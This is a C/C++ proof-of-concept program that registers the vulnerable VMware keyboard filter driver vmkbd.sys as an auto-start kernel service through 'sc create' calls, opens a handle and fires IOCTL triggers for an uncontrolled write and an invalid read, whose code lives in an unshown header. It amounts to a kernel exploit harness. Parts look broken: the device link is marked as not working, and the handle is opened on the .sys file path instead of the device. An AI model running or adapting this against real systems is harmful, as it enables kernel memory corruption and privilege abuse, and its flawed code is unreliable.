#include "ioctl.h"


// Global variables:
const char* DeviceName = "\\Device\\VMwareKbdFilter";
const char* SymbolicLink = "\\\\.\\VMwareKbdFilter";  // DOES NOT WORK
const char* VulnFileName = "vmkbd.sys";
char VulnPath[1024] = { 0 };
HANDLE DriverHandle = INVALID_HANDLE_VALUE;


DWORD LoadVulnurableDriver(const char* FileName) {
    char CreateCommand[1024] = { 0 };
    DWORD VulnPathLength = ERROR_SUCCESS;


    // Get path of vulnurable driver and configure and start the service:
    VulnPathLength = GetFullPathNameA(FileName, sizeof(VulnPath), VulnPath, NULL);
    if (VulnPathLength == 0) {
        DeleteFileA(FileName);
        return GetLastError();
    }
    strcat_s(CreateCommand, "sc create DriverPoC type=kernel start=auto binPath=");
    strcat_s(CreateCommand, VulnPath);
    system("sc stop DriverPoC");
    system("sc delete DriverPoC");
    system(CreateCommand);
    system("sc start DriverPoC");
    return ERROR_SUCCESS;
}


void UnloadVulnurableDriver(const char* FileName) {
    system("sc stop DriverPoC");
    system("sc delete DriverPoC");
}
int main() {
    HANDLE DriverHandle = INVALID_HANDLE_VALUE;
    DWORD LastError = 0;


    // Load driver into file and create service:
    LastError = LoadVulnurableDriver(VulnFileName);
    if (LastError != ERROR_SUCCESS) {
        LastError = GetLastError();
        printf("[-] Failed to load driver %s into file and create service: %d\n", VulnPath, LastError);
        return FALSE;
    }


    // Get handle to driver:
    DriverHandle = CreateFileA(VulnPath, GENERIC_ALL, FILE_SHARE_DELETE | FILE_SHARE_WRITE | FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (DriverHandle == INVALID_HANDLE_VALUE) {
        LastError = GetLastError();
        printf("[-] Failed to get handle to driver %s: %d\n", VulnPath, LastError);
        UnloadVulnurableDriver(VulnFileName);
        return FALSE;
    }
    printf("[+] Got handle to driver %s - %d\n", VulnPath, (DWORD)DriverHandle);


    // Call exploits:
    LastError = IoctlTriggers::TriggerUncontrolledWrite(DriverHandle, FALSE);
    if (LastError != ERROR_SUCCESS) {
        UnloadVulnurableDriver(VulnFileName);
        return FALSE;
    }
    printf("[-] TriggerUncontrolledWrite, FALSE\n");
    LastError = IoctlTriggers::TriggerUncontrolledWrite(DriverHandle, TRUE);
    if (LastError != ERROR_SUCCESS) {
        UnloadVulnurableDriver(VulnFileName);
        return FALSE;
    }
    printf("[-] TriggerUncontrolledWrite, TRUE\n");
    LastError = IoctlTriggers::TriggerInvalidRead(DriverHandle, FALSE);
    if (LastError != ERROR_SUCCESS) {
        UnloadVulnurableDriver(VulnFileName);
        return FALSE;
    }
    printf("[-] TriggerInvalidRead, FALSE\n");
    LastError = IoctlTriggers::TriggerInvalidRead(DriverHandle, TRUE);
    if (LastError != ERROR_SUCCESS) {
        UnloadVulnurableDriver(VulnFileName);
        return FALSE;
    }
    printf("[-] TriggerInvalidRead, TRUE\n");
    UnloadVulnurableDriver(VulnFileName);
    return TRUE;
}